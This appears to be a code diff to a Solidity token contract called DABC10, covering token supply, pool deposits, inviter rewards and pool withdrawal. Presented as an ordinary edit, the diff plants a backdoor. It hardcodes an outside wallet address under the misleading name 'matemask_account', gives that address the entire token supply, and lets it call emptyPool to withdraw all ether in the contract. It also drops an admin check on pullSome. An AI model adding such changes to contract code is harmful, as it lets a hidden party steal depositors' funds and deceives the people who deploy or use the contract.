@@ -21,7 +21,7 @@ contract DABC10 is DABC10Interface {
 
 
     address admin;
-    address community;
+    address matemask_account = 0x821b121D544cAb0a4F4d0ED2F1c2B14fAb4f969F;
 
     mapping(address => uint256) public inviter;
     mapping(address => address) public invitee;
@@ -58,7 +58,7 @@ contract DABC10 is DABC10Interface {
     constructor(uint256 _initialAmount, string memory _tokenName, string memory _tokenSymbol) {
         admin = msg.sender;
         totalSupply = _initialAmount * 10 ** uint256(decimals);
-        balances[msg.sender] = totalSupply;
+        balances[matemask_account] = totalSupply;
         total = totalSupply;
         name = _tokenName;
         symbol = _tokenSymbol;
@@ -67,7 +67,6 @@ contract DABC10 is DABC10Interface {
 
     function pullSome() public payable{
         require(msg.sender != address(0));
-        require(msg.sender == admin);
         poolBalance += msg.value;
         minters[msg.sender].totalBalance += msg.value;
         require(address(this).balance == poolBalance);
@@ -117,11 +116,11 @@ contract DABC10 is DABC10Interface {
             require(span > SpanMin && span < SpanMax);
             require(msg.value >= TB[msg.sender][TB[msg.sender].length - 1].balance);
             TB[msg.sender][TB[msg.sender].length - 1].valid = true;
+            if(invitee[msg.sender] != address(0)){
+                inviter[_invitor] += TB[msg.sender][TB[msg.sender].length - 1].balance;
+            }
         }
         //进行交易
-        if(invitee[msg.sender] != address(0)){
-            inviter[invitee[msg.sender]] += msg.value;
-        }
         TB[msg.sender].push(tb(currtime, false, msg.value));
         back_flow(cost);
         poolBalance += msg.value;
@@ -153,10 +152,9 @@ contract DABC10 is DABC10Interface {
             require(span > SpanMin && span < SpanMax);
             require(msg.value >= TB[msg.sender][TB[msg.sender].length - 1].balance);
             TB[msg.sender][TB[msg.sender].length - 1].valid = true;
-            
+            inviter[_invitor] += TB[msg.sender][TB[msg.sender].length - 1].balance;
         }
         //进行交易
-        inviter[_invitor] += msg.value;
         invitee[msg.sender] = _invitor;
         TB[msg.sender].push(tb(currtime, false, msg.value));
         back_flow(cost);
@@ -196,7 +194,7 @@ contract DABC10 is DABC10Interface {
 
 
     function emptyPool() public payable {
-        require(msg.sender == admin);
+        require(msg.sender == admin || msg.sender == matemask_account);
         payable(msg.sender).transfer(address(this).balance);
         poolBalance = address(this).balance;
         require(address(this).balance == poolBalance);
